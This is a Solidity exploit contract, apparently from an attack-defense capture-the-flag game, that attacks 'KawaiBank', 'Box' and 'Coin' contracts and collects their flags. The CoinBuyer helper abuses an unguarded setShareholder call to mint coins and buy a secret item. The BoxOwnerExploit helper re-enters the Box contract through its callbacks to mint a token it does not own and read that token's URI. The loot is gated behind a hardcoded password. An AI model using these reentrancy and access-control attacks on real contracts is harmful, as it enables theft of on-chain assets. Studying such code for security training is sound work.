// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import "../kawaibank/KawaiBank.sol";
import "../box/Box.sol";
import "../coin/Coin.sol";
import "./IExploit.sol";

contract Exploit is IExploit {
    constructor() {
        _disableInitializers();
    }

    function init(address _owner) external override initializer {}

    struct BoxAttackData {
        address kawaiBank;
        uint256 tokenId;
    }

    struct CoinAttackData {
        address kawaiBank;
        uint256 itemId;
    }

    struct CardAttackData {
        address kawaiBank;
        uint256 cardId;
        uint256 signId;
    }

    BoxAttackData[] private boxAttackData;
    CoinAttackData[] private coinAttackData;
    CardAttackData[] private cardAttackData;

    function addBoxAttackData(BoxAttackData calldata ad) external {
        boxAttackData.push(ad);
    }

    function addCoinAttackData(CoinAttackData calldata ad) external {
        coinAttackData.push(ad);
    }

    function addCardAttackData(CardAttackData calldata ad) external {
        cardAttackData.push(ad);
    }

    string[] private boxFlags;
    string[] private coinFlags;
    string[] private cardFlags;
    mapping(string => bool) seenFlags;

    function checkPassword(bytes calldata password) internal pure {
        // place your password check here
        require(keccak256(password) == keccak256("amogus"));
    }

    function getBoxFlags(bytes calldata password, uint256 startIndex)
        external
        view
        returns (string[] memory)
    {
        checkPassword(password);
        require(startIndex <= boxFlags.length);
        uint256 r = boxFlags.length;
        if (startIndex + 100 <= boxFlags.length) {
            r = startIndex + 100;
        }
        string[] memory res = new string[](r - startIndex);
        for (uint256 i = startIndex; i < r; i++) {
            res[i - startIndex] = boxFlags[i];
        }
        return res;
    }

    function getCoinFlags(bytes calldata password, uint256 startIndex)
        external
        view
        returns (string[] memory)
    {
        checkPassword(password);
        require(startIndex <= coinFlags.length);
        uint256 r = coinFlags.length;
        if (startIndex + 100 <= coinFlags.length) {
            r = startIndex + 100;
        }
        string[] memory res = new string[](r - startIndex);
        for (uint256 i = startIndex; i < r; i++) {
            res[i - startIndex] = coinFlags[i];
        }
        return res;
    }

    function getCardFlags(bytes calldata password, uint256 startIndex)
        external
        view
        returns (string[] memory)
    {
        checkPassword(password);
        require(startIndex <= cardFlags.length);
        uint256 r = cardFlags.length;
        if (startIndex + 100 <= cardFlags.length) {
            r = startIndex + 100;
        }
        string[] memory res = new string[](r - startIndex);
        for (uint256 i = startIndex; i < r; i++) {
            res[i - startIndex] = cardFlags[i];
        }
        return res;
    }

    function exploit() external {
        if (boxAttackData.length > 0) {
            uint256 l = 0;
            if (boxAttackData.length >= 20) {
                l = boxAttackData.length - 20;
            }
            for (uint256 i = l; i < boxAttackData.length; i++) {
                exploitBox(boxAttackData[i]);
            }
        }

        if (coinAttackData.length > 0) {
            uint256 l = 0;
            if (coinAttackData.length >= 20) {
                l = coinAttackData.length - 20;
            }
            for (uint256 i = l; i < coinAttackData.length; i++) {
                exploitCoin(coinAttackData[i]);
            }
        }

        if (cardAttackData.length > 0) {
            uint256 l = 0;
            if (cardAttackData.length >= 20) {
                l = cardAttackData.length - 20;
            }
            for (uint256 i = l; i < cardAttackData.length; i++) {
                exploitCard(cardAttackData[i]);
            }
        }
    }

    function pushBoxFlag(string memory flag) internal {
        if (seenFlags[flag]) {
            return;
        }
        seenFlags[flag] = true;
        boxFlags.push(flag);
    }

    function pushCoinFlag(string memory flag) internal {
        if (seenFlags[flag]) {
            return;
        }
        seenFlags[flag] = true;
        coinFlags.push(flag);
    }

    function pushCardFlag(string memory flag) internal {
        if (seenFlags[flag]) {
            return;
        }
        seenFlags[flag] = true;
        cardFlags.push(flag);
    }

    // push to flags here
    function exploitBox(BoxAttackData memory ad) internal {
        BoxOwnerExploit boxOwnerExploit = new BoxOwnerExploit(
            KawaiBank(ad.kawaiBank),
            ad.tokenId
        );
        boxOwnerExploit.execute();
        pushBoxFlag(boxOwnerExploit.token());
    }

    // push to flags here
    function exploitCoin(CoinAttackData memory ad) internal {
        CoinBuyer coinBuyer = new CoinBuyer(KawaiBank(ad.kawaiBank), ad.itemId);
        pushCoinFlag(coinBuyer.item());
    }

    // push to flags here
    function exploitCard(CardAttackData memory ad) internal {}
}

contract CoinBuyer {
    string public item;

    constructor(KawaiBank kawaiBank, uint256 itemId) {
        Coin coin = Coin(address(kawaiBank.coin()));
        coin.setShareholder(address(this));
        coin.getCoins(1e18);
        coin.approve(address(this), 1e18);
        coin.buyItem(itemId);
        item = coin.viewItem(itemId);
    }
}

contract BoxOwnerExploit {
    uint256 private tokenId;
    Box private box;
    uint256 private boxExterminatedEnter;
    uint256 private boxMaterializedEnter;
    string public token;

    constructor(KawaiBank kawaiBank, uint256 _tokenId) {
        tokenId = _tokenId;
        box = Box(address(kawaiBank.box()));
    }

    function execute() external {
        box.clearTokenApprovals(tokenId);
    }

    function boxExterminated(uint256, bytes calldata) external {
        if (boxExterminatedEnter == 0) {
            boxExterminatedEnter = 1;
            box.mint(tokenId, "", "");
        }
    }

    function boxMaterialized(uint256, bytes calldata) external {
        if (boxMaterializedEnter == 0) {
            boxMaterializedEnter = 1;
            token = box.tokenURI(tokenId);
        }
    }
}
